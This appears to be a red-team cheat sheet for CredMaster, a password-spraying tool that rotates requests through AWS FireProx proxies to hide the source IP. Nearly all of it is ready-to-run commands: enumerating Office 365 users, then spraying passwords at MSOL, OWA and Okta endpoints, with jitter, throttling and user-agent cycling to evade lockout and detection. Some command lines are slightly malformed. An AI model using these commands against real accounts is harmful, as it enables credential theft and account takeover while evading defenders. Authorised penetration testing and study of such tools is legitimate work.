
# CredMaster
Init
> "Launch a password spray / brute force attach via Amazon AWS passthrough proxies, shifting the requesting IP address for every authentication attempt. This dynamically creates FireProx APIs for more evasive password sprays."
> -GitHub
## Use
Needs an AWS key to spin up EC2 instances for the job. Put into `aws.config`.
```json
{
        "region" : "us-east-1",
        "access_key" : "",
        "secret_access_key" : "",
        "session_token" : null,
        "profile_name" : null                                           
}
```
### Flags
- `-u` username file
- `-t` threads
- `--plugin` plugin to use
- `--config` config file to use
- `-p` passwords file
- `-o` output file
- `-ua` user agents list to cycle thru
- `-t` throttling
- `-m` min jitter *has to be a higher number than `-j`*
- `-j` jitter
### Plugin Examples
#### O365 User Enum
```bash
python3 credmaster.py \
--plugin o365enum \
--config aws.config \
-u usernames.txt \
-t 8 
```
CredMaster will also create a `credmaster-validusers.txt` file with all of the valid usernames it finds with this command.
#### Spraying Plugin
```bash
python3 credmaster.py --plugin msol --config aws.config -u credmaster-validusers.txt -p passwords.txt -o 
```
#### MSOL
```bash
python3 credmaster.py -u "all_emails_v1.txt" \ 
-p pass.txt \ 
--plugin msol \ 
--config aws.config \ 
--color \ 
-o "credmaster-MSOL-out-3.txt" \ 
-t 5 -j 15 -m 10 \ 
-a ua.txt # list of user agent strings to use
```
#### o365enum
```bash
python3 credmaster.py -u "users.txt" \
-p pass.txt \
--plugin o365enum \
--config aws.config \
--color \
-o "./o365-enum-out" \
-t 5 -j 15 -m 10 \ # jitter has to be higher than throttle
-a ua.txt
```
#### OWA Plugin Spray
**NOTE** use a url you've found on the target's actual domain.
```bash
python3 credmaster.py -u "/root/target/users.txt" \
-p pass.txt \
--plugin owa \
--url "https://target.mail.onmicrosoft.com" \.
--config aws.config \
-o "/root/target/OWA-credmaster-out"
```
#### Okta
```bash 
python3 credmaster.py \
--plugin okta \
--config aws.config \
-u users.txt \
-p passwords.txt \
-o okta-out \
--url https://target.okta.com
```

> [!Resources]
> - [GitHub](https://github.com/knavesec/CredMaster)